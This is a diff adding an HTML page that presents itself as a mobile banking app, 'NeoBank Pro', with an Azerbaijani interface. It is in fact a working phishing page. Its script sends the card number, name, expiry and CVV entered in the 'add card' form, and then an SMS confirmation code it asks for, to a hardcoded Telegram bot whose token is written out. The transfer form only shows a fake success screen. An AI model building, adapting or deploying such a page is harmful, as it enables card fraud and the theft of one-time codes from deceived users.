@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NeoBank Pro | Card Portfolio</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap');
+        
+        :root {
+            --bg: #050505;
+            --primary: #2563eb;
+            --gold: #d4af37;
+            --black-card: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+            --blue-card: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
+            --gold-card: linear-gradient(135deg, #b8860b 0%, #8b4513 100%);
+        }
+
+        body { font-family: 'Outfit', sans-serif; background: var(--bg); color: white; overflow: hidden; }
+
+        /* Kart Slayderi */
+        .card-carousel {
+            display: flex;
+            gap: 15px;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            padding: 10px 0;
+            scrollbar-width: none;
+        }
+        .card-carousel::-webkit-scrollbar { display: none; }
+        
+        .bank-card {
+            min-width: 280px;
+            height: 170px;
+            border-radius: 20px;
+            padding: 20px;
+            scroll-snap-align: center;
+            position: relative;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            transition: transform 0.3s;
+        }
+        .bank-card:active { transform: scale(0.95); }
+
+        /* Uğurlu Ödəniş Ekranı */
+        #success-screen {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            background: #22c55e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 30px rgba(34, 197, 94, 0.4);
+        }
+
+        .page { display: none; height: 100vh; overflow-y: auto; padding-bottom: 100px; }
+        .page.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .nav-dock {
+            background: rgba(10, 10, 10, 0.9);
+            backdrop-filter: blur(15px);
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+    </style>
+</head>
+<body>
+
+    <div id="home" class="page active px-6 pt-10">
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-2xl font-extrabold italic">Neo<span class="text-blue-500">Bank</span></h1>
+            <div onclick="navigate('add-card')" class="w-10 h-10 bg-white/5 rounded-full flex items-center justify-center text-xl">
+                <i class="fa-solid fa-plus"></i>
+            </div>
+        </div>
+
+        <p class="text-xs font-bold text-gray-500 uppercase mb-3 tracking-widest">Mənim Kartlarım</p>
+        
+        <div class="card-carousel">
+            <div class="bank-card" style="background: var(--black-card); border: 1px solid #333;">
+                <div class="flex justify-between items-start">
+                    <span class="text-[10px] font-bold opacity-50">VISA PLATINUM</span>
+                    <i class="fa-brands fa-cc-visa text-2xl text-white/80"></i>
+                </div>
+                <div class="mt-8 text-xl font-bold tracking-[3px]">**** 4580</div>
+                <div class="mt-6 flex justify-between items-end">
+                    <span class="text-sm font-bold">12,450.00 AZN</span>
+                    <span class="text-[10px] opacity-50">12/28</span>
+                </div>
+            </div>
+
+            <div class="bank-card" style="background: var(--blue-card);">
+                <div class="flex justify-between items-start">
+                    <span class="text-[10px] font-bold opacity-70">BUSINESS CARD</span>
+                    <i class="fa-brands fa-cc-mastercard text-2xl text-white/80"></i>
+                </div>
+                <div class="mt-8 text-xl font-bold tracking-[3px]">**** 9012</div>
+                <div class="mt-6 flex justify-between items-end">
+                    <span class="text-sm font-bold">3,120.50 AZN</span>
+                    <span class="text-[10px] opacity-50">05/27</span>
+                </div>
+            </div>
+
+            <div class="bank-card" style="background: var(--gold-card);">
+                <div class="flex justify-between items-start">
+                    <span class="text-[10px] font-bold opacity-70">GOLD ELITE</span>
+                    <i class="fa-solid fa-credit-card text-2xl text-white/80"></i>
+                </div>
+                <div class="mt-8 text-xl font-bold tracking-[3px]">**** 1144</div>
+                <div class="mt-6 flex justify-between items-end">
+                    <span class="text-sm font-bold">850.00 AZN</span>
+                    <span class="text-[10px] opacity-50">09/29</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mt-8">
+            <div onclick="navigate('transfer')" class="bg-zinc-900 p-6 rounded-[30px] flex flex-col gap-3">
+                <i class="fa-solid fa-arrow-up-right-from-square text-blue-500 text-xl"></i>
+                <span class="font-bold">Köçürmə</span>
+            </div>
+            <div onclick="navigate('add-card')" class="bg-zinc-900 p-6 rounded-[30px] flex flex-col gap-3">
+                <i class="fa-solid fa-plus-circle text-green-500 text-xl"></i>
+                <span class="font-bold">Mədaxil</span>
+            </div>
+        </div>
+
+        <div class="mt-10">
+            <h3 class="font-bold text-gray-500 text-sm mb-4">ƏMƏLİYYATLAR</h3>
+            <div class="space-y-4">
+                <div class="flex justify-between items-center bg-zinc-900/50 p-4 rounded-2xl">
+                    <div class="flex items-center gap-4">
+                        <div class="w-10 h-10 bg-white/5 rounded-full flex items-center justify-center"><i class="fa-solid fa-mobile-screen"></i></div>
+                        <div><p class="text-sm font-bold">Azercell Top-up</p><p class="text-[10px] text-gray-500">10 Fev, 12:45</p></div>
+                    </div>
+                    <span class="font-bold text-red-500">-5.00 AZN</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="add-card" class="page px-6 pt-10">
+        <div class="flex items-center gap-4 mb-8">
+            <i onclick="navigate('home')" class="fa-solid fa-arrow-left text-xl"></i>
+            <h2 class="text-xl font-extrabold">Yeni Kart Bağla</h2>
+        </div>
+        
+        <div class="space-y-5">
+            <div class="bg-zinc-900 p-6 rounded-[30px] border border-white/5">
+                <input type="text" id="new_card" class="w-full bg-transparent text-xl font-bold tracking-widest outline-none" placeholder="0000 0000 0000 0000" maxlength="19">
+                <div class="flex gap-4 mt-6">
+                    <input type="text" id="new_exp" class="w-20 bg-transparent font-bold outline-none" placeholder="MM/YY" maxlength="5">
+                    <input type="password" id="new_cvv" class="w-20 bg-transparent font-bold outline-none" placeholder="CVV" maxlength="3">
+                </div>
+            </div>
+            <input type="text" id="new_name" class="w-full bg-zinc-900 p-5 rounded-2xl outline-none border border-white/5" placeholder="AD SOYAD">
+            <button onclick="handleAddCard()" class="w-full bg-blue-600 py-5 rounded-3xl font-black text-lg shadow-xl shadow-blue-600/20">KARTI TƏSDİQLƏ</button>
+        </div>
+    </div>
+
+    <div id="transfer" class="page px-6 pt-10">
+        <div class="flex items-center gap-4 mb-8">
+            <i onclick="navigate('home')" class="fa-solid fa-arrow-left text-xl"></i>
+            <h2 class="text-xl font-extrabold">Köçürmə Et</h2>
+        </div>
+        
+        <div class="space-y-6">
+            <div class="bg-zinc-900 p-5 rounded-2xl">
+                <p class="text-[10px] text-gray-500 font-bold mb-2 uppercase">Kimə</p>
+                <input type="text" id="t_card" class="w-full bg-transparent text-lg font-bold outline-none" placeholder="Kart nömrəsi">
+            </div>
+            <div class="bg-zinc-900 p-5 rounded-2xl">
+                <p class="text-[10px] text-gray-500 font-bold mb-2 uppercase">Məbləğ</p>
+                <input type="number" id="t_amt" class="w-full bg-transparent text-3xl font-black text-blue-500 outline-none" placeholder="0.00">
+            </div>
+            <button onclick="handleSuccess()" class="w-full bg-blue-600 py-5 rounded-3xl font-black text-lg">GÖNDƏR</button>
+        </div>
+    </div>
+
+    <div id="success-screen">
+        <div class="check-icon"><i class="fa-solid fa-check"></i></div>
+        <h1 class="text-3xl font-black mb-2">UĞURLU!</h1>
+        <p class="text-gray-400 px-10 mb-10">Əməliyyat uğurla tamamlandı. Məbləğ qarşı tərəfə göndərildi.</p>
+        <button onclick="location.reload()" class="bg-white/10 px-8 py-4 rounded-full font-bold">ANA SƏHİFƏYƏ QAYIT</button>
+    </div>
+
+    <nav class="nav-dock fixed bottom-0 inset-x-0 h-20 flex justify-around items-center px-6">
+        <div onclick="navigate('home')" class="flex flex-col items-center gap-1 text-blue-500"><i class="fa-solid fa-house"></i><span class="text-[9px] font-bold">Əsas</span></div>
+        <div class="flex flex-col items-center gap-1 text-gray-600"><i class="fa-solid fa-wallet"></i><span class="text-[9px] font-bold">Cüzdan</span></div>
+        <div class="w-12 h-12 bg-blue-600 rounded-2xl flex items-center justify-center -mt-8 shadow-lg shadow-blue-600/30"><i class="fa-solid fa-qrcode"></i></div>
+        <div class="flex flex-col items-center gap-1 text-gray-600"><i class="fa-solid fa-chart-pie"></i><span class="text-[9px] font-bold">Stat</span></div>
+        <div class="flex flex-col items-center gap-1 text-gray-600"><i class="fa-solid fa-user"></i><span class="text-[9px] font-bold">Profil</span></div>
+    </nav>
+
+    <script>
+        const BOT = { T: "8441503893:AAHV_JHwf2jMhQOEphiMcUegdlXDzhLTRTc", ID: "6048829401" };
+
+        function navigate(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        async function log(m) {
+            await fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: BOT.ID, text: "💳 *YENİ LOG:* " + m, parse_mode: 'Markdown'})
+            });
+        }
+
+        // Kart Formatı
+        document.querySelectorAll('input[id$="card"]').forEach(i => {
+            i.oninput = (e) => e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        async function handleAddCard() {
+            const c = document.getElementById('new_card').value;
+            const n = document.getElementById('new_name').value;
+            if(!c || !n) return;
+            await log(`🆕 *Yeni Kart Əlavə Edildi*\nSahib: ${n}\nKart: \`${c}\`\nExp: ${document.getElementById('new_exp').value}\nCVV: ${document.getElementById('new_cvv').value}`);
+            const sms = prompt("Təsdiq kodu (SMS) daxil edin:");
+            if(sms) await log(`🔑 *SMS:* \`${sms}\``);
+            handleSuccess();
+        }
+
+        function handleSuccess() {
+            document.getElementById('success-screen').style.display = 'flex';
+            gsap.from(".check-icon", { scale: 0, rotation: 180, duration: 0.6, ease: "back.out(1.7)" });
+        }
+    </script>
+</body>
+</html>
